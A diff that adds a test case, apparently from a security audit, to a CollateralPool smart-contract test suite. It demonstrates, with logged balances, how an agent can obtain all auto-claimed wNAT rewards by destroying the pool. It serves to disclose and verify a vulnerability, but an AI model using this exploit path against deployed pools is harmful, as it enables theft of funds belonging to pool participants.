@@ -1125,6 +1125,31 @@ contract(`CollateralPool.sol; ${getTestFile(__filename)}; Collateral pool basic 
             assertEqualBNWithError(account1FreeFassetAfter, account1FreeFassetBefore, BN_ONE);
         });
 
+        it("coinspect - can steal all auto-claimed rewards upon destruction", async () => {
+            const contract = await MockContract.new();
+            await collateralPool.setAutoClaiming(contract.address, [accounts[2]], { from: agent });
+            let totalCollateral = await collateralPool.totalCollateral();
+            let poolwNatBalance = await wNat.balanceOf(collateralPool.address);
+            console.log("\n === Initial Pool State ===");
+            console.log(`Total Collateral accounted: ${totalCollateral}`);
+            console.log(`Pool wNAT balance: ${poolwNatBalance}`);
+            // Simulate auto claims with an inlet of WNAT via depositTo (ultimately mints token to the recipient)
+            await wNat.mintAmount(collateralPool.address, ETH(10));
+            totalCollateral = await collateralPool.totalCollateral();
+            poolwNatBalance = await wNat.balanceOf(collateralPool.address);
+            console.log("\n === After Auto-Claim ===");
+            console.log(`Total Collateral accounted: ${totalCollateral}`);
+            console.log(`Pool wNAT balance: ${poolwNatBalance}`);
+            let balanceOfAgent = await wNat.balanceOf(agent);
+            console.log("\n === Before Pool Destruction ===");
+            console.log(`Agent wNAT balance: ${balanceOfAgent}`);
+            const payload = collateralPool.contract.methods.destroy(agent).encodeABI();
+            await assetManager.callFunctionAt(collateralPool.address, payload);
+            balanceOfAgent = await wNat.balanceOf(agent);
+            console.log("\n === After Pool Destruction ===");
+            console.log(`Agent wNAT balance: ${balanceOfAgent}`);
+        });
+
     });
 
     describe("methods for pool liquidation through asset manager", async () => {
